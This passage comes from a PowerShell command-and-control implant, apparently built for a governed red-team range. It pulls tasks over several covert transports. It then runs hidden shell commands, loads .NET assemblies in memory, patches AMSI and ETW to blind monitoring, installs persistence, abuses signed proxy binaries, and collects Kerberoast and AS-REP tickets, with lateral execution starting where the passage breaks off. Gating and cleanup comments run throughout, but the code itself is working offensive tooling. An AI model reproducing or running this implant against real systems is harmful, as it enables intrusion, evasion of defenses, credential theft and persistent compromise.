  } catch { Write-Host ('  [push failed: ' + $_.Exception.Message + ']') }
}

# ==WEDGE-GUARD== begin (the 2026-08-25 MpCmdRun finding: a direct MpCmdRun -Scan shell
# task froze even the first-gen guard - delivered-forever, checkins stopped, the 45s
# tree-kill never fired). Diagnosis from the code + the ledger: the old guard only
# covered the CLEAN timeout path (poll HasExited -> taskkill). It had NO catch anywhere:
# Start-Process failing on a blocked spawn, or $p.HasExited FAULTING on an AV-killed/
# Defender-suspended child ('no process associated' / access denied), threw straight out
# of Invoke-Task and killed the loop - the guard never got to fire. It also could not
# see pipe-orphans (taskkill /T walks only LIVE parent links; a child whose parent died
# keeps the dead pid in its ParentProcessId field and escapes the /T walk), and the
# serial loop made zero checkins for the task's whole duration. The harness below covers
# the full catalogue: hard wall-clock per task, tree-kill (inner soft, outer hard),
# pipe-orphan detection+sweep, mid-task heartbeat checkins, and never-throw semantics.
# This block is deliberately self-contained and dot-source-extractable (the markers) so
# test/wedge-guard.test.mjs pins every class of the contract against REAL wedging
# children. It adds NO capability - reliability plumbing only.

# Every LIVE process whose parent chain passes through $RootPid - INCLUDING orphans: a
# child whose parent died keeps the dead parent's id in ParentProcessId, so the walk
# still finds it (the 'start /b' pipe-orphan class). CIM read-only; on a sick-service
# window this can take seconds (measured 2.5-5s on the range) - the harness's hard cap
# covers even that. An unreadable process table returns empty, never a wedge.
function Get-VvDescendantIds([int]$RootPid) {
  $byParent = @{}
  try {
    Get-CimInstance Win32_Process -ErrorAction Stop | ForEach-Object {
      $pp = [int]$_.ParentProcessId
      if (-not $byParent.ContainsKey($pp)) { $byParent[$pp] = @() }
      $byParent[$pp] = @($byParent[$pp]) + [int]$_.ProcessId
    }
  } catch { return @() }
  $found = @()
  $frontier = @($RootPid)
  while ($frontier.Count -gt 0) {
    $next = @()
    foreach ($f in $frontier) {
      $kids = $byParent[$f]
      if ($null -eq $kids) { continue }
      foreach ($c in $kids) {
        if ($found -notcontains $c) { $found = @($found) + $c; $next = @($next) + $c }
      }
    }
    $frontier = $next
  }
  return $found
}

# Kill the tasked tree AND its pipe-orphans. taskkill /T handles the live-linked tree;
# the descendant sweep then finds whatever outlived its parent (taskkill /T cannot -
# those links are dead). Returns @{ orphans = n } - only the sweep is counted honestly
# (taskkill's own success/failure on an already-dead pid is not a meaningful signal).
# ($Pid is a READ-ONLY automatic variable in PowerShell - the parameter is $RootPid; a
# $Pid parameter throws at bind time, which a caller's try/catch would silently eat.)
function Stop-VvProcessTree([int]$RootPid) {
  $orphans = 0
  if ($RootPid -le 0) { return @{ orphans = 0 } }
  try { & taskkill /PID $RootPid /T /F 2>&1 | Out-Null } catch {}
  foreach ($d in (Get-VvDescendantIds $RootPid)) {
    try { Stop-Process -Id $d -Force -ErrorAction Stop; $orphans++ } catch {}
  }
  return @{ orphans = $orphans }
}

# Invoke-VvShellGuarded <command> <softSec> <hardSec> <heartbeatSec> <heartbeatSb> [sync]
# Run ONE shell task where it can NEVER hold the serial task loop hostage:
#   - the spawn+poll+kill+read runs in a NESTED RUNSPACE (same pattern as inline-dotnet)
#   - SOFT timeout (softSec): tree-kill inside the runspace (today's behavior, kept)
#   - HARD wall-clock (hardSec): if the inner guard itself wedges or silently dies, the
#     OUTER wait fires, Stop()s the runspace, and kills the recorded child tree from
#     HERE ($sync.Pid is published the moment the spawn returns - a synchronized
#     hashtable, so the outer side can act on a wedged inner side)
#   - mid-task HEARTBEAT: the heartbeat scriptblock fires every heartbeatSec from the
#     outer wait loop (main runspace) - the agent keeps checking in while a task runs
#   - guarded HasExited: a faulted handle (AV-killed child) is 'dead', noted, never a throw
#   - pipe-orphan sweep on EVERY completion, counted and reported
# Returns the task's output text. NEVER throws; NEVER blocks past hardSec (a hung
# heartbeat can delay the hard cap - noted honestly; the channel went dark then anyway).
# The optional $Sync is the TEST SEAM (the harness publishes the child pid there).
function Invoke-VvShellGuarded([string]$Command, [int]$TimeoutSec, [int]$HardTimeoutSec, [int]$HeartbeatSec, [scriptblock]$Heartbeat, $Sync = $null) {
  $syncRef = $Sync
  if ($null -eq $syncRef) { $syncRef = [hashtable]::Synchronized(@{ Pid = 0; Note = '' }) }
  $inner = {
    param($Cmd, $SoftSec, $Sync)
    $ErrorActionPreference = 'Continue'
    $tmpOut = Join-Path $env:TEMP ('va-task-' + [Guid]::NewGuid().ToString('N') + '.log')
    $out = ''
    $p = $null
    try { $p = Start-Process cmd.exe -ArgumentList '/d','/c',"$Cmd > `"$tmpOut`" 2>&1" -WindowStyle Hidden -PassThru -ErrorAction Stop }
    catch { return ('TASK SPAWN FAILED: ' + ($_.Exception.Message -replace '[\r\n]+', ' ') + ' - nothing executed; the task loop survives') }
    $Sync.Pid = [int]$p.Id
    $sw = [Diagnostics.Stopwatch]::StartNew()
    $killed = $false
    $exited = $false
    while ($sw.Elapsed.TotalSeconds -lt $SoftSec) {
      # The MpCmdRun-class guard: HasExited can FAULT on a child the AV killed or
      # suspended mid-stream - that is 'dead', honestly noted, NEVER an unhandled throw
      # up through the task loop (the throw path is what killed the agent 2026-08-25).
      try { if ($p.HasExited) { $exited = $true; break } }
      catch { $Sync.Note = 'child handle faulted mid-poll (' + ($_.Exception.Message -replace '[\r\n]+', ' ') + ') - treated as dead (the AV-kill shape)'; $exited = $true; break }
      Start-Sleep -Milliseconds 250
    }
    if (-not $exited) {
      $killed = $true
      try { & taskkill /PID $Sync.Pid /T /F 2>&1 | Out-Null } catch {}
      Start-Sleep -Milliseconds 500
    }
    try {
      $fs = [IO.File]::Open($tmpOut, 'Open', 'Read', 'ReadWrite')
      $sr = New-Object IO.StreamReader($fs)
      $out = $sr.ReadToEnd()
      $sr.Close(); $fs.Close()
    } catch {}
    try { Remove-Item $tmpOut -Force -ErrorAction SilentlyContinue } catch {}
    if ($killed) { $out = "TASK TIMEOUT after ${SoftSec}s - process tree killed (the task loop survives; wedge class eliminated)`r`n" + $out }
    if ($Sync.Note.Length -gt 0) { $out = $Sync.Note + "`r`n" + $out }
    return $out
  }
  $run = $null
  try {
    $run = [powershell]::Create().AddScript($inner.ToString()).AddArgument($Command).AddArgument($TimeoutSec).AddArgument($syncRef)
  } catch {
    return ('task harness failed to build (caught, loop survives): ' + ($_.Exception.Message -replace '[\r\n]+', ' '))
  }
  $handle = $run.BeginInvoke()
  $swOuter = [Diagnostics.Stopwatch]::StartNew()
  $lastBeat = 0.0
  $hard = $false
  while (-not $handle.IsCompleted) {
    [void]$handle.AsyncWaitHandle.WaitOne(500)
    if ($null -ne $Heartbeat -and $HeartbeatSec -gt 0 -and ($swOuter.Elapsed.TotalSeconds - $lastBeat) -ge $HeartbeatSec) {
      $lastBeat = $swOuter.Elapsed.TotalSeconds
      try { & $Heartbeat } catch {}  # a heartbeat fault must never wedge the guard
    }
    if ($swOuter.Elapsed.TotalSeconds -ge $HardTimeoutSec) { $hard = $true; break }
  }
  $out = ''
  # Orphan-spawn settle: a 'start /b' child can be created AFTER its cmd parent exits -
  # sweep too early and the process table does not list it yet. Settle first, then sweep.
  Start-Sleep -Milliseconds 750
  if ($hard) {
    # THE OUTER NET: the inner guard wedged or died silently (the MpCmdRun class) -
    # Stop() its runspace and kill the recorded child tree from this side.
    try { $run.Stop() } catch {}
    $orph = 0
    if ($syncRef.Pid -gt 0) { try { $orph = [int](Stop-VvProcessTree ([int]$syncRef.Pid)).orphans } catch {} }
    $out = "TASK HARD TIMEOUT after ${HardTimeoutSec}s - the wedged task runspace was Stop()ed and its child tree killed outer-side ($orph orphan(s) swept); the task loop survives (wedge class eliminated)"
  } else {
    try {
      $res = $run.EndInvoke($handle)
      if ($res.Count -gt 0) { $out = [string]$res[0] }
    } catch { $out = 'task harness fault (caught, loop survives): ' + ($_.Exception.Message -replace '[\r\n]+', ' ') }
    # Pipe-orphan sweep on EVERY completion: a clean-exiting cmd can leave 'start /b'
    # children holding the redirected handles - they outlive the task and park the next
    # reader. Swept, counted, honestly reported.
    $orph = 0
    if ($syncRef.Pid -gt 0) { try { $orph = [int](Stop-VvProcessTree ([int]$syncRef.Pid)).orphans } catch {} }
    if ($orph -gt 0) { $out = $out + "`r`n[orphan sweep: $orph pipe-inheriting descendant(s) of the tasked tree killed - the start /b wedge class]" }
  }
  try { $run.Dispose() } catch {}
  if ($out.Length -gt 60000) { $out = $out.Substring(0, 60000) }
  return $out
}
# ==WEDGE-GUARD== end ---------------------------------------------------------

# The mid-task checkin the wedge guard beats on: ONE pull on the ACTIVE transport. The
# channel drains at most one queued task per pull; anything delivered queues LOCALLY
# ($script:PendingTasks) and runs AFTER the current task - serial execution preserved.
# This is what keeps checkins/lastSeen alive while a long (or wedged) task runs: the
# channel ledger no longer reads 'delivered-forever' for a task that is still working.
# (ws is a PUSH wire - there is no poll cadence to keep alive, so no heartbeat there.)
function Invoke-VvTaskHeartbeat {
  $t = $null
  try {
    if ($Transport -eq 'http') { $t = Invoke-Pull }
    elseif ($Transport -eq 'icmp') { $t = Invoke-IcmpPull }
    elseif ($Transport -eq 'doh') { $t = Invoke-DohPull }
    elseif ($Transport -eq 'ws') { $t = $null }
    else { $t = Invoke-DnsPull }
  } catch {}
  if ($null -ne $t) { $script:PendingTasks = @($script:PendingTasks) + @($t) }
}

function Invoke-Task($Task) {
  switch ($Task.kind) {
    'shell' {
      # Timeout+kill contract: a shell task may NEVER hold the serial task loop hostage
      # (the wedge class that cost a full day of range ops - and 2026-08-25 proved the
      # first-gen guard incomplete when MpCmdRun froze even it). All of it now lives in
      # the ==WEDGE-GUARD== harness above: soft timeout + tree-kill inside a nested
      # runspace, a HARD outer wall clock that Stop()s a wedged guard and kills the child
      # tree outer-side, pipe-orphan sweeps on every completion, heartbeat checkins while
      # the task runs - and never-throw semantics throughout. The loop survives every
      # task now, by construction.
      $beat = $null
      if ($TaskHeartbeatSec -gt 0) { $beat = ${function:Invoke-VvTaskHeartbeat} }
      $out = Invoke-VvShellGuarded ([string]$Task.data) $TaskTimeoutSec $TaskHardTimeoutSec $TaskHeartbeatSec $beat
      return [Text.Encoding]::UTF8.GetBytes($out.Trim())
    }
    'fetch' {
      try {
        $spec = $Task.data | ConvertFrom-Json
        return [IO.File]::ReadAllBytes((Resolve-Sandbox $spec.path))
      } catch { return [Text.Encoding]::UTF8.GetBytes("fetch failed: $($_.Exception.Message)") }
    }
    'stage' {
      try {
        $spec = $Task.data | ConvertFrom-Json
        $bytes = [Convert]::FromBase64String($spec.b64)
        $hash = Get-Sha256Hex $bytes
        if ($hash -ne $spec.sha256) { return [Text.Encoding]::UTF8.GetBytes('stage REJECTED: sha256 mismatch (tampered or truncated delivery)') }
        $dest = Resolve-Sandbox (Split-Path $spec.name -Leaf)
        [IO.File]::WriteAllBytes($dest, $bytes)
        return [Text.Encoding]::UTF8.GetBytes("staged $($spec.name) ($($bytes.Length) bytes, sha256 verified)")
      } catch { return [Text.Encoding]::UTF8.GetBytes("stage failed: $($_.Exception.Message)") }
    }
    'note' { return [Text.Encoding]::UTF8.GetBytes("noted: $($Task.data)") }
    'inline-dotnet' {
      # IN-MEMORY EXECUTION TIER (gap #4 remainder): execute a .NET assembly in THIS agent
      # process's own memory - [Reflection.Assembly]::Load(byte[]) straight from the task
      # JSON; the bytes NEVER touch disk. DOUBLY GATED, fail-closed: the channel refuses
      # to queue this kind unless the engagement enabled exec.inMemory, and this agent
      # refuses unless launched with -AllowInMemoryExec.
      # DOCTRINE (2026-08-12): the old absolute no-evasion rule is LIFTED for the
      # governed evasion tier ONLY (the evasion-* cases below - default OFF, double-
      # gated, patch-verified, restorable, detoracle-measured). BY DEFAULT nothing here
      # is patched: if AMSI/Defender scans the byte[] load, that scan is the detection
      # surface the detoracle measures (tools/detoracle.mjs). So be it.
      # Result body is ONE JSON string, hash first:
      #   {"sha256","bytes","entryPoint","exitCode","timedOut","stdout","stderr"}
      # - the ledger preview always carries the sha256 accountability trail (the bytes
      #   themselves are gone - never written anywhere). Refusals are loud plain text.
      if (-not $AllowInMemoryExec) {
        return [Text.Encoding]::UTF8.GetBytes('inline-dotnet REFUSED: agent-side in-memory execution is OFF (launch with -AllowInMemoryExec; the engagement exec.inMemory gate must also be on) - nothing executed')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $bytes = [Convert]::FromBase64String([string]$spec.assemblyB64)
        if ($bytes.Length -eq 0) { return [Text.Encoding]::UTF8.GetBytes('inline-dotnet REJECTED: assemblyB64 decoded to zero bytes - nothing executed') }
        if ($bytes.Length -gt 1048576) { return [Text.Encoding]::UTF8.GetBytes("inline-dotnet REJECTED: assembly is $($bytes.Length) bytes - over the 1048576-byte cap (nothing executed)") }
        $hash = Get-Sha256Hex $bytes
        $asmArgs = @()
        if ($spec.args) { $asmArgs = @($spec.args | ForEach-Object { [string]$_ }) }
        $epName = ''
        if ($spec.entryPoint) { $epName = [string]$spec.entryPoint }
        $outW = New-Object System.IO.StringWriter
        $errW = New-Object System.IO.StringWriter
        # The invoke runs in a NESTED RUNSPACE with a bounded wait (60s): a wedged assembly
        # gets its pipeline Stop()ed and the serial task loop SURVIVES (the same wedge
        # class the shell-task timeout killed). [Console]::SetOut is process-wide, so the
        # writers restore in finally; the loop is blocked on the wait, so nothing races.
        $invoke = {
          param($B, $A, $E, $OW, $EW)
          $oldOut = [Console]::Out; $oldErr = [Console]::Error
          [Console]::SetOut($OW); [Console]::SetError($EW)
          $code = 0
          try {
            $asm = [Reflection.Assembly]::Load($B)   # in-memory load; AMSI may scan - by design
            $entry = $asm.EntryPoint
            if ($E.Length -gt 0) {
              # Override shape: 'Namespace.Type.Method' - a STATIC method, string[] or no args.
              $i = $E.LastIndexOf('.')
              if ($i -lt 1) { throw "entryPoint override must be 'Namespace.Type.Method' (got '$E')" }
              $ty = $asm.GetType($E.Substring(0, $i))
              if ($null -eq $ty) { throw "type not found in assembly: $($E.Substring(0, $i))" }
              $entry = $ty.GetMethod($E.Substring($i + 1), [Reflection.BindingFlags]('Public,NonPublic,Static'))
            }
            if ($null -eq $entry) { throw 'no entry point: the assembly has no EntryPoint and no valid override was given' }
            $r = $null
            if ($entry.GetParameters().Count -gt 0) { $r = $entry.Invoke($null, @(, [string[]]$A)) } else { $r = $entry.Invoke($null, $null) }
            if ($r -is [int]) { $code = [int]$r }
          } catch { [Console]::Error.WriteLine($_.Exception.ToString()); $code = -1 }
          finally { [Console]::SetOut($oldOut); [Console]::SetError($oldErr) }
          return $code
        }
        $run = [powershell]::Create().AddScript($invoke.ToString()).AddArgument($bytes).AddArgument($asmArgs).AddArgument($epName).AddArgument($outW).AddArgument($errW)
        $handle = $run.BeginInvoke()
        $timedOut = $false
        if (-not $handle.AsyncWaitHandle.WaitOne(60000)) { $timedOut = $true; try { $run.Stop() } catch {} }
        $code = -1
        if (-not $timedOut) {
          try { $res = $run.EndInvoke($handle); if ($res.Count -gt 0) { $code = [int]$res[0] } }
          catch { $errW.WriteLine($_.Exception.ToString()) }
        }
        $run.Dispose()
        $stdout = $outW.ToString(); $stderr = $errW.ToString()
        if ($timedOut) { $stderr += "`nTIMEOUT after 60s - runspace Stop()ed; the load already happened (a .NET Framework assembly cannot be unloaded), the task loop survived" }
        if ($stdout.Length -gt 58000) { $stdout = $stdout.Substring(0, 58000) + "`n[truncated at 58000 chars]" }
        if ($stderr.Length -gt 20000) { $stderr = $stderr.Substring(0, 20000) + "`n[truncated at 20000 chars]" }
        $json = ([ordered]@{ sha256 = $hash; bytes = $bytes.Length; entryPoint = $(if ($epName.Length -gt 0) { $epName } else { $null }); exitCode = $code; timedOut = $timedOut; stdout = $stdout; stderr = $stderr } | ConvertTo-Json -Compress)
        return [Text.Encoding]::UTF8.GetBytes($json)
      } catch { return [Text.Encoding]::UTF8.GetBytes("inline-dotnet failed: $($_.Exception.Message)") }
    }
    'evasion-enable' {
      # EVASION INTERNALS TIER (stage 1, doctrine 2026-08-12): patch THIS agent process's
      # OWN amsi.dll!AmsiScanBuffer / ntdll.dll!EtwEventWrite in memory (well-published
      # public recipes in the ==EVASION-LIB== block). DOUBLY GATED, fail-closed: the
      # channel refused to queue this kind unless the engagement enabled exec.evasion,
      # and THIS agent refuses unless launched with -AllowEvasion. Every patch is
      # snapshot-first, re-read-VERIFIED, and (amsi) proven by the official test-string
      # flip blocked->clear - measured, never assumed. Own process ONLY; reversible via
      # evasion-restore; process exit restores everything by construction.
      # Result body is ONE JSON string, op first: {"op","pid","state","techniques":{...},
      # "at"} - the channel intake audits the per-technique original/patched sha256 +
      # verification evidence from exactly this shape. Refusals are loud plain text.
      if (-not $AllowEvasion) {
        return [Text.Encoding]::UTF8.GetBytes('evasion-enable REFUSED: agent-side evasion is OFF (launch with -AllowEvasion; the engagement exec.evasion gate must also be on) - nothing patched')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $techs = @($spec.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 })
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvEvasionOp 'enable' ([string[]]$techs)))
      } catch { return [Text.Encoding]::UTF8.GetBytes("evasion-enable failed: $($_.Exception.Message)") }
    }
    'evasion-restore' {
      # The cleanup half of the tier (mandatory): write the SNAPSHOT bytes back over each
      # live patch and PROVE the restore (re-read == original; amsi also re-scans the
      # official test string - the clear->blocked flip-back is measured). Empty data (or
      # '{}') restores whatever THIS process currently has patched.
      if (-not $AllowEvasion) {
        return [Text.Encoding]::UTF8.GetBytes('evasion-restore REFUSED: agent-side evasion is OFF (launch with -AllowEvasion; the engagement exec.evasion gate must also be on) - nothing restored')
      }
      try {
        $techs = @()
        if ($Task.data -and "$($Task.data)".Trim().Length -gt 0 -and "$($Task.data)".Trim() -ne '{}') {
          $spec = $Task.data | ConvertFrom-Json
          if ($spec.techniques) { $techs = @($spec.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 }) }
        }
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvEvasionOp 'restore' ([string[]]$techs)))
      } catch { return [Text.Encoding]::UTF8.GetBytes("evasion-restore failed: $($_.Exception.Message)") }
    }
    'evasion-status' {
      # Honest self-report: patched / restored / failed / not-applied per technique, with
      # the hash evidence - and a LIVE re-read for anything 'patched' (measured now, not
      # remembered). The detoracle phrasing contract rides on this honesty: 'unmonitored'
      # from here on means monitoring neutralized (self-reported, patch-verified) - it
      # NEVER masquerades as 'clean'.
      if (-not $AllowEvasion) {
        return [Text.Encoding]::UTF8.GetBytes('evasion-status REFUSED: agent-side evasion is OFF (launch with -AllowEvasion; the engagement exec.evasion gate must also be on) - no state reported')
      }
      try { return [Text.Encoding]::UTF8.GetBytes((Invoke-VvEvasionOp 'status' @())) }
      catch { return [Text.Encoding]::UTF8.GetBytes("evasion-status failed: $($_.Exception.Message)") }
    }
    'persist-install' {
      # GOVERNED PERSISTENCE TIER (roadmap #8): install user-land persistence that
      # relaunches THIS agent with THIS config (the relaunch line was captured at
      # startup from the live launch parameters - the channel never ships a command
      # line). DOUBLY GATED, fail-closed: the channel refused to queue this kind unless
      # the engagement enabled persist.enabled, and THIS agent refuses unless launched
      # with -AllowPersist. CLEANUP-PROOF (the signature doctrine - persistence that
      # cannot prove its own removal never installs): pre-install state is snapshotted
      # into the sandbox removal manifest FIRST, a foreign value is never clobbered
      # silently (overwrite:true journals it for restore-on-remove), and the write is
      # PROVEN by re-read. Result body is ONE JSON string, op first:
      # {"op","pid","state","techniques":{...},"at"} - the channel intake audits the
      # per-technique location + targetSha256 + verification evidence from exactly this
      # shape. Refusals are loud plain text.
      if (-not $AllowPersist) {
        return [Text.Encoding]::UTF8.GetBytes('persist-install REFUSED: agent-side persistence is OFF (launch with -AllowPersist; the engagement persist.enabled gate must also be on) - nothing installed')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $techs = @($spec.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 })
        $nm = $script:VvPersistName
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $nm = [string]$spec.name }
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvPersistOp 'install' ([string[]]$techs) $nm $script:VvRelaunchLine ($spec.overwrite -eq $true) $false $script:VvPersistManifestPath $spec.deep $false))
      } catch { return [Text.Encoding]::UTF8.GetBytes("persist-install failed: $($_.Exception.Message)") }
    }
    'persist-remove' {
      # The mandatory cleanup half: execute the removal, then VERIFY absence by re-read
      # (a journaled pre-install value is restored and re-verified instead). A removal
      # that cannot verify is 'removal-failed' - LOUD, escalated channel-side as
      # persist.remove-failed, and the engagement cannot be called clean while it stands.
      if (-not $AllowPersist) {
        return [Text.Encoding]::UTF8.GetBytes('persist-remove REFUSED: agent-side persistence is OFF (launch with -AllowPersist; the engagement persist.enabled gate must also be on) - nothing removed')
      }
      try {
        $techs = @(); $all = $false; $nm = $script:VvPersistName
        $spec = $Task.data | ConvertFrom-Json
        if ($spec.all -eq $true) { $all = $true }
        if ($spec.techniques) { $techs = @($spec.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 }) }
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $nm = [string]$spec.name }
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvPersistOp 'remove' ([string[]]$techs) $nm $script:VvRelaunchLine $false $all $script:VvPersistManifestPath $spec.deep $false))
      } catch { return [Text.Encoding]::UTF8.GetBytes("persist-remove failed: $($_.Exception.Message)") }
    }
    'persist-status' {
      # Honest self-report per technique: installed (present + intact + pointing at THIS
      # agent's relaunch line) / tampered / removed / missing / foreign-present / absent
      # - a LIVE re-read, measured now, never remembered.
      if (-not $AllowPersist) {
        return [Text.Encoding]::UTF8.GetBytes('persist-status REFUSED: agent-side persistence is OFF (launch with -AllowPersist; the engagement persist.enabled gate must also be on) - no state reported')
      }
      try {
        $techs = @(); $nm = $script:VvPersistName; $spec = $null
        if ($Task.data -and "$($Task.data)".Trim().Length -gt 0 -and "$($Task.data)".Trim() -ne '{}') {
          $spec = $Task.data | ConvertFrom-Json
          if ($spec.techniques) { $techs = @($spec.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 }) }
          if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $nm = [string]$spec.name }
        }
        # prove:true runs the BENIGN resolve-proof on installed comhijack rows (a
        # throwaway child instantiates the CLSID; the child is confirmed to exit).
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvPersistOp 'status' ([string[]]$techs) $nm $script:VvRelaunchLine $false $false $script:VvPersistManifestPath $(if ($spec) { $spec.deep } else { $null }) ($null -ne $spec -and $spec.prove -eq $true)))
      } catch { return [Text.Encoding]::UTF8.GetBytes("persist-status failed: $($_.Exception.Message)") }
    }
    'persist-audit' {
      # The engagement sweep: every manifest entry re-probed LIVE; the result says
      # clean ONLY when zero open (still-present / removal-unverified) entries remain -
      # the platform refuses to call an engagement clean while unverified persistence
      # exists. Lands channel-side as 'persist.sweep'.
      if (-not $AllowPersist) {
        return [Text.Encoding]::UTF8.GetBytes('persist-audit REFUSED: agent-side persistence is OFF (launch with -AllowPersist; the engagement persist.enabled gate must also be on) - no sweep run')
      }
      try { return [Text.Encoding]::UTF8.GetBytes((Invoke-VvPersistOp 'audit' @() $script:VvPersistName $script:VvRelaunchLine $false $false $script:VvPersistManifestPath)) }
      catch { return [Text.Encoding]::UTF8.GetBytes("persist-audit failed: $($_.Exception.Message)") }
    }
    'execproxy-run' {
      # SIGNED-PROXY EXECUTION TIER: run the agent's DLL form through a Microsoft-signed
      # host (rundll32-class direct load / regsvr32-class load-only / sideload-class
      # search-order plant of COPIES inside the sandbox - never in place, never beside
      # the original in system dirs). DOUBLY GATED, fail-closed: the channel refused to
      # queue this kind unless the engagement enabled exec.proxy, and THIS agent refuses
      # unless launched with -AllowProxyExec. CLEANUP-PROOF (the persist-tier doctrine):
      # pre-plant snapshot FIRST, foreign-clobber refusal, plant proven by sha256
      # re-read, removal verified ABSENT by re-read. Result body is ONE JSON string, op
      # first: {"op","pid","state","names":{...},"at"} - the channel intake audits the
      # per-name technique + command + every planted/executed file's sha256 from
      # exactly this shape. Refusals are loud plain text.
      if (-not $AllowProxyExec) {
        return [Text.Encoding]::UTF8.GetBytes('execproxy-run REFUSED: agent-side proxy execution is OFF (launch with -AllowProxyExec; the engagement exec.proxy gate must also be on) - nothing planted, nothing executed')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $nm = $script:VvProxyName
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $nm = [string]$spec.name }
        $job = @{ op = 'run'; technique = ([string]$spec.technique).ToLower(); dll = [string]$spec.dll; name = $nm; sandbox = $Sandbox; manifestPath = $script:VvExecProxyManifestPath }
        if ($spec.export) { $job.export = [string]$spec.export }
        if ($null -ne $spec.args -and ([string]$spec.args).Length -gt 0) { $job.args = [string]$spec.args }
        if ($spec.host) { $job.host = [string]$spec.host }
        if ($spec.as) { $job.as = [string]$spec.as }
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvProxyOp 'run' $job))
      } catch { return [Text.Encoding]::UTF8.GetBytes("execproxy-run failed: $($_.Exception.Message)") }
    }
    'execproxy-remove' {
      # The mandatory cleanup half: delete ONLY files whose live hash still matches what
      # we planted (a hash-changed plant is a loud refused-foreign - we never delete
      # what we did not write), then VERIFY absence by re-read. A removal that cannot
      # verify is 'removal-failed' - LOUD, escalated channel-side as
      # execproxy.remove-failed, and the engagement cannot be called clean while it stands.
      if (-not $AllowProxyExec) {
        return [Text.Encoding]::UTF8.GetBytes('execproxy-remove REFUSED: agent-side proxy execution is OFF (launch with -AllowProxyExec; the engagement exec.proxy gate must also be on) - nothing removed')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        $job = @{ op = 'remove'; all = ($spec.all -eq $true); sandbox = $Sandbox; manifestPath = $script:VvExecProxyManifestPath }
        if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $job.name = [string]$spec.name }
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvProxyOp 'remove' $job))
      } catch { return [Text.Encoding]::UTF8.GetBytes("execproxy-remove failed: $($_.Exception.Message)") }
    }
    'execproxy-status' {
      # Honest self-report + the engagement sweep: every manifest entry re-probed LIVE
      # (measured now, never remembered); the sweep says clean ONLY when zero open
      # (still-present / removal-unverified) name handles remain. Lands channel-side
      # as 'execproxy.status'.
      if (-not $AllowProxyExec) {
        return [Text.Encoding]::UTF8.GetBytes('execproxy-status REFUSED: agent-side proxy execution is OFF (launch with -AllowProxyExec; the engagement exec.proxy gate must also be on) - no state reported')
      }
      try {
        $job = @{ op = 'status'; sandbox = $Sandbox; manifestPath = $script:VvExecProxyManifestPath }
        if ($Task.data -and "$($Task.data)".Trim().Length -gt 0 -and "$($Task.data)".Trim() -ne '{}') {
          $spec = $Task.data | ConvertFrom-Json
          if ($spec.name -and ([string]$spec.name).Trim().Length -gt 0) { $job.name = [string]$spec.name }
        }
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvProxyOp 'status' $job))
      } catch { return [Text.Encoding]::UTF8.GetBytes("execproxy-status failed: $($_.Exception.Message)") }
    }
    'adroast-enum' {
      # GOVERNED AD TIER rung 1: LDAP targeting only (SPN + DONT_REQ_PREAUTH account
      # discovery) - see ==ADROAST-LIB==. DOUBLY GATED, fail-closed: the channel
      # refused to queue this kind unless the engagement enabled ad.roast AND the DC
      # sits inside the signed CIDR ring; THIS agent refuses unless launched with
      # -AllowAdRoast. Result body is ONE op-first JSON evidence string; refusals are
      # loud plain text.
      if (-not $AllowAdRoast) {
        return [Text.Encoding]::UTF8.GetBytes('adroast-enum REFUSED: agent-side roast collection is OFF (launch with -AllowAdRoast; the engagement ad.roast gate must also be on) - no LDAP targeting ran')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvAdRoastOp 'enum' $spec))
      } catch { return [Text.Encoding]::UTF8.GetBytes("adroast-enum failed: $($_.Exception.Message)") }
    }
    'adroast-kerberoast' {
      # SPN service-ticket collection: .NET KerberosRequestorSecurityToken per SPN
      # (ordinary Kerberos traffic - the tradecraft point); the RAW AP-REQ bytes ride
      # back and are parsed + hashcat-formatted CHANNEL-SIDE (engine/adroast.mjs).
      # Cracking is OFFLINE operator-side tooling, never online.
      if (-not $AllowAdRoast) {
        return [Text.Encoding]::UTF8.GetBytes('adroast-kerberoast REFUSED: agent-side roast collection is OFF (launch with -AllowAdRoast; the engagement ad.roast gate must also be on) - no ticket was requested')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvAdRoastOp 'kerberoast' $spec))
      } catch { return [Text.Encoding]::UTF8.GetBytes("adroast-kerberoast failed: $($_.Exception.Message)") }
    }
    'adroast-asrep' {
      # DONT_REQ_PREAUTH collection: a raw TCP/88 splat of the ENGINE-BUILT AS-REQ
      # bytes per account (no creds, no crypto - the mechanic itself). AS-REP bytes
      # ride back; parsing + formatting are channel-side.
      if (-not $AllowAdRoast) {
        return [Text.Encoding]::UTF8.GetBytes('adroast-asrep REFUSED: agent-side roast collection is OFF (launch with -AllowAdRoast; the engagement ad.roast gate must also be on) - no AS-REQ was sent')
      }
      try {
        $spec = $Task.data | ConvertFrom-Json
        return [Text.Encoding]::UTF8.GetBytes((Invoke-VvAdRoastOp 'asrep' $spec))
      } catch { return [Text.Encoding]::UTF8.GetBytes("adroast-asrep failed: $($_.Exception.Message)") }
    }
    'lateral-exec' {
      # GOVERNED AD TIER rung 2: lateral execution on the RANGE via wmi / winrm /
      # psexec-class adapters with operator-supplied creds - see ==LATERAL-LIB==.
